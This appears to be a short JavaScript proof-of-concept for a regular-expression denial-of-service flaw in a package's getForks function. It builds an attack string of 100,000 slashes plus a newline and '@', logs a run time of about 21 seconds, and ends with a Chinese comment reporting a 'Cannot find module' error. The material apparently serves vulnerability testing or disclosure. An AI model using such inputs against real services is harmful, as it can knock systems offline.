const pkg = require("./modules.js");
const getForks = pkg.getForks;

//Attack String :""+"/"*100000+"\n@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "/";
}
str += "\n@";

console.log(getForks("", str, "", ""));


// real    0m21.438s
// user    0m21.383s
// sys     0m0.010s


//报错：Cannot find module